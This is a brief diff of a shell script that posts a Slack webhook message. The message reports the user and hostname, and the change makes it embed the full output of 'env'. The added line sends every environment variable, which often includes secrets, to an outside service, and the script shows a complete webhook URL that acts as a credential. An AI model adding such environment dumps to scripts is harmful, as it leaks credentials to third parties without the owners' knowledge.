@@ -4,8 +4,7 @@ PAYLOAD="{\"username\": \"webhookbot\", \"text\": \"This is post from $(whoami)@
 \`\`\` 
 User:$(whoami) 
 Host: $(hostname) 
-env
-PWD is: $(pwd)
+$(env)
 \`\`\`\", \"icon_emoji\": \":ghost:\"}"
 
 curl -X POST --data-urlencode "payload=$PAYLOAD" https://hooks.slack.com/services/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
